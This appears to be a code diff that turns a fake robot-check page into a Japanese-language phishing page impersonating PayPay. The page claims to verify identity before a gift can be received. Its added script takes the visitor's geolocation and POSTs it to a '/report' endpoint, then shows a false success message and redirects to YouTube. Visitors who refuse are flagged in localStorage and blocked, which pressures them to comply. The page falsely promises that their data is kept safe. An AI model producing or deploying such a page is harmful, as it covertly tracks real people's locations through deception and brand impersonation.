@@ -3,57 +3,120 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ロボット確認</title>
+  <title>本人確認</title>
   <style>
     body {
       font-family: sans-serif;
       text-align: center;
-      padding: 50px;
+      padding: 30px;
+      background-color: #f7f7f7;
     }
-    .warning {
-      color: red;
-      font-weight: bold;
+    .logo {
+      margin-top: 20px;
+    }
+    .card {
+      background-color: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      padding: 25px;
+      display: inline-block;
+      max-width: 400px;
+      width: 100%;
+    }
+    h2 {
+      color: #e60012;
+      font-size: 22px;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 16px;
       margin-bottom: 20px;
     }
-    label {
-      font-size: 18px;
-    }
     button {
-      margin-top: 20px;
-      padding: 10px 20px;
+      background-color: #e60012;
+      color: white;
       font-size: 16px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 15px;
+    }
+    .warning {
+      color: #b00020;
+      font-size: 14px;
+      font-weight: bold;
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
-  <div>
-    <div class="warning">ロボットと検知されたため、次に進むには下記を許可してください。</div>
-    <label><input type="checkbox" id="verify"> 私はロボットではありません</label><br>
-    <button onclick="checkHuman()">次へ</button>
+
+  <img src="https://www.paypay.ne.jp/img/logo.svg" width="120" class="logo">
+  
+  <div class="card">
+    <h2>ご本人様確認</h2>
+    <p>
+      ギフトの不正取得を防ぐため、現在の位置情報を確認しています。<br>
+      <b>PayPayのセキュリティ対策</b>として、全利用者に実施しております。
+    </p>
+    <div class="warning">
+      ※位置情報を<b>許可されない場合、受け取りはできません。</b>
+    </div>
+    <p>
+      ご提供いただいた情報は<b>即時処理され、安全に管理</b>されますのでご安心ください。
+    </p>
+    <button onclick="verifyLocation()">位置情報を確認して受け取る</button>
+    <div class="note">
+      ※本確認は一度のみです。拒否した場合は再取得不可となります。
+    </div>
   </div>
 
   <script>
-    function checkHuman() {
-      const checkbox = document.getElementById('verify');
-      if (!checkbox.checked) {
-        alert("チェックを入れてください");
-        return;
-      }
-
+    function verifyLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            alert("許可されました。次に進みます");
-            location.href = "https://www.youtube.com/";
+            fetch('/report', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude
+              })
+            }).then(() => {
+              alert("本人確認が完了しました。ギフトを受け取ります。");
+              location.href = "https://www.youtube.com/";
+            });
           },
           err => {
-            alert("位置情報が拒否されたため、ロボットと判断されました。次に進めません。");
+            alert("⚠️ 位置情報が拒否されたため、ギフトを受け取ることができません。");
+            localStorage.setItem('robot', 'true');
+            location.reload(); // 次回アクセス拒否
           }
         );
       } else {
-        alert("お使いの端末では位置情報が利用できません。");
+        alert("この端末では位置情報が使用できません。");
+        localStorage.setItem('robot', 'true');
+        location.reload();
       }
     }
+
+    // 拒否済みのユーザーにはブロック画面
+    if (localStorage.getItem('robot') === 'true') {
+      document.body.innerHTML = `
+        <div style="padding:50px; text-align:center;">
+          <img src="https://www.paypay.ne.jp/img/logo.svg" width="120"><br><br>
+          <h2 style="color:#e60012;">アクセスが制限されました</h2>
+          <p>過去に位置情報取得を拒否したため、<br>この端末からは受け取り手続きができません。</p>
+        </div>
+      `;
+    }
   </script>
+
 </body>
 </html>
